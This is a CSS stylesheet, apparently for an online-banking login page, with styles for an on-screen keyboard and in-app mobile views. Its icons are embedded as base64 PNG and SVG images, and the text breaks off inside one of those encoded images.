 
  body.keyboardfile div.clear{
  clear:left;
  }
 
  body.keyboardfile .functions{
  margin-top:16px !important;
  }
  
body.keyboardfile .centerbutton{
  margin:2px 2px 2px 46px !important;
  }
  
  
  body.keyboardfile input.keypadButtonOK{
   display:block;
  margin: 16px auto 2px auto !important;
  }
  /************************************************************************
     * inApp Styles for mobile devices
     ************************************************************************/    
    body.isApp .language,  body.isApp .infotext, body.isApp .text.moved{
        display:none;
    }
    body.isApp div.col2 >.whitebox,body.isApp div.col2 >.whitebox-info{
        height:250px;
    }
    body.isApp.loginerror .infotext{
        display:block;
    }
    body.isApp.loginerror div.col2 >.whitebox{
        height:300px;
    }
     body.isApp .wrapper{
    margin-bottom:0 !important;
    padding-bottom:6px;
    }
    body.isApp .openkeyboard{display:none !important;}
    body.isApp .keyboard{display:none;}
    body.isApp .col1 h1 + p{display:none;}  


/************************************************************************
* change Verfüger  - 26.8.2014
************************************************************************/  
span.changenumber{
    display:inline-block;
    z-index:1;
    position:absolute;
    right:20px;
    top:12px;
}
span.changenumber > a{
    display:inline-block;
    width:16px;
    height:16px;
    /*background-image:url(Remove.png);*/
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAbCAYAAACAyoQSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAbtJREFUeNqslstxgzAQhoEK3EFcAh3EdKCcczBccvVQAXYFxNdcTA45B1dgOggdBHdACdmdLBlQdvUAdkYjBoQ+rfbflcLA096qjy1029Gr/iV9bn3mCB1BO+j20BS0jTCshnaFBVSLoACLoSuh7Twc6aCdTPDQADxCVwTzDT3PAN47QQF4gS4NlhvGOtHBkeDhGkA0DM9NfxkxgimCdS0mR0RPS8PPFW0XZ7h9r9RzVlCqTaHwUtF2cIaCyDA+DLinuOX0XQRznu4lDwf5kyDG4AHY0nfsn4R5FAdVwuBJMRiB6zFQEw87D2nmN2WoCHyZ4knba6tcqPqLYQgWjWPEecNYSrm7BCjnqQVcCkDlCHzwhWIs34VvjSGdxnb3gfaCaAJB1U7b2/oCByV6grs/KP0gDT4zQBTNTRcXzZMboI2+vVK8DpRSnEonqobnjaGUNrCobnK00Q/fQvoMWxcLKsWKdYL2aSml1b/zdIWDOzB4mbB5itXCVYGeqZbbioPppJhjmS7EaGnOWTxEYO1UBmllCR3MS+5G1ax7LxWBg+Ho02Fn2903dF06pZSi2/2jBrqTQp1C8iPAAA7cvoztbcobAAAAAElFTkSuQmCC);
    /*background-image:url(Remove.svg);*/
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIGlua3NjYXBlOnZlcnNpb249IjAuNDguMy4xIHI5ODg2IiBzb2RpcG9kaTpkb2NuYW1lPSJyZW1vdmVfc2lnbl9mb250X2F3ZXNvbWUuc3ZnIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6c29kaXBvZGk9Imh0dHA6Ly9zb2RpcG9kaS5zb3VyY2Vmb3JnZS5uZXQvRFREL3NvZGlwb2RpLTAuZHRkIiB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSINCgkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHdpZHRoPSIyOC41NzFweCINCgkgaGVpZ2h0PSIyNi45MDFweCIgdmlld0JveD0iMC41MjggLTI1NC4xOTggMjguNTcxIDI2LjkwMSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwLjUyOCAtMjU0LjE5OCAyOC41NzEgMjYuOTAxIg0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxzb2RpcG9kaTpuYW1lZHZpZXcgIGlkPSJuYW1lZHZpZXczMDE5IiBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJzdmczMDEzIiBpbmtzY2FwZTp3aW5kb3cteT0iMjUiIGlua3NjYXBlOndpbmRvdy14PSIwIiBpbmtzY2FwZTp3aW5kb3ctaGVpZ2h0PSI0ODAiIGlua3NjYXBlOndpbmRvdy13aWR0aD0iNjQwIiBpbmtzY2FwZTpwYWdlc2hhZG93PSIyIiBpbmtzY2FwZTpwYWdlb3BhY2l0eT0iMCIgaW5rc2NhcGU6em9vbT0iMC4xMzE2OTY0MyIgYm9yZGVyb3BhY2l0eT0iMSIgc2hvd2dyaWQ9ImZhbHNlIiBib3JkZXJjb2xvcj0iIzY2NjY2NiIgZ3VpZGV0b2xlcmFuY2U9IjEwIiBvYmplY3R0b2xlcmFuY2U9IjEwIiBwYWdlY29sb3I9IiNmZmZmZmYiIGdyaWR0b2xlcmFuY2U9IjEwIiBpbmtzY2FwZTpjeD0iODk2IiBpbmtzY2FwZTpjeT0iODk2IiBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIwIj4NCgk8L3NvZGlwb2RpOm5hbWVkdmlldz4NCjxnIGlkPSJnMzAxNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSwwLDAsLTEsMTM2LjY3Nzk3LDEyOTMuMDE2OSkiPg0KCTxwYXRoIGlkPSJwYXRoMzAxNyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iIzlBQTBBNSIgZD0iTS0xMTUuMTU1LDE1MzAuMDE1YzAsMC4yOS0wLjEwNSwwLjU0Mi0wLjMxOCwwLjc1Mw0KCQlsLTMuMDI5LDMuMDNsMy4wMjksMy4wM2MwLjIxMywwLjIxMiwwLjMxOCwwLjQ2MywwLjMxOCwwLjc1M2MwLDAuMzAxLTAuMTA1LDAuNTU4LTAuMzE4LDAuNzdsLTEuNTA2LDEuNTA3DQoJCWMtMC4yMTMsMC4yMTItMC40NjksMC4zMTgtMC43NzEsMC4zMThjLTAuMjksMC0wLjU0MS0wLjEwNi0wLjc1My0wLjMxOGwtMy4wMy0zLjAzbC0zLjAzLDMuMDMNCgkJYy0wLjIxMiwwLjIxMi0wLjQ2MywwLjMxOC0wLjc1MywwLjMxOGMtMC4zMDEsMC0wLjU1OC0wLjEwNi0wLjc3LTAuMzE4bC0xLjUwNy0xLjUwN2MtMC4yMTItMC4yMTItMC4zMTgtMC40NjktMC4zMTgtMC43Nw0KCQljMC0wLjI5LDAuMTA2LTAuNTQxLDAuMzE4LTAuNzUzbDMuMDMtMy4wM2wtMy4wMy0zLjAzYy0wLjIxMi0wLjIxMi0wLjMxOC0wLjQ2My0wLjMxOC0wLjc1M2MwLTAuMzAxLDAuMTA2LTAuNTU4LDAuMzE4LTAuNzcNCgkJbDEuNTA3LTEuNTA3YzAuMjEyLTAuMjEyLDAuNDY5LTAuMzE4LDAuNzctMC4zMThjMC4yOSwwLDAuNTQyLDAuMTA2LDAuNzUzLDAuMzE4bDMuMDMsMy4wM2wzLjAzLTMuMDMNCgkJYzAuMjEyLTAuMjEyLDAuNDYzLTAuMzE4LDAuNzUzLTAuMzE4YzAuMzAyLDAsMC41NTgsMC4xMDYsMC43NzEsMC4zMThsMS41MDYsMS41MDcNCgkJQy0xMTUuMjYsMTUyOS40NTctMTE1LjE1NSwxNTI5LjcxNC0xMTUuMTU1LDE1MzAuMDE1eiBNLTEwOC42NzYsMTUzMy43OTljMC0yLjMzMy0wLjU3NC00LjQ4NC0xLjcyNC02LjQ1NA0KCQljLTEuMTQ5LTEuOTctMi43MS0zLjUzLTQuNjc5LTQuNjc5Yy0xLjk3MS0xLjE1LTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1cy00LjQ4NCwwLjU3NS02LjQ1NCwxLjcyNQ0KCQljLTEuOTcsMS4xNDktMy41MjksMi43MDktNC42NzksNC42NzljLTEuMTUsMS45Ny0xLjcyNSw0LjEyMS0xLjcyNSw2LjQ1NHMwLjU3NSw0LjQ4NCwxLjcyNSw2LjQ1NA0KCQljMS4xNDksMS45NywyLjcwOSwzLjUyOSw0LjY3OSw0LjY3OWMxLjk3LDEuMTQ5LDQuMTIxLDEuNzI0LDYuNDU0LDEuNzI0czQuNDgzLTAuNTc1LDYuNDU0LTEuNzI0DQoJCWMxLjk2OS0xLjE1LDMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5Uy0xMDguNjc2LDE1MzYuMTMyLTEwOC42NzYsMTUzMy43OTl6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==);
    background-size:contain;
    background-repeat:no-repeat;
}

/************************************************************************
* open keyboard icon in passworf field  - 26.8.2014
************************************************************************/  

a.openkeyboard.inInput:after{
    content:" ";
    width: 24px;
    height: 16px;
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,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);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDEx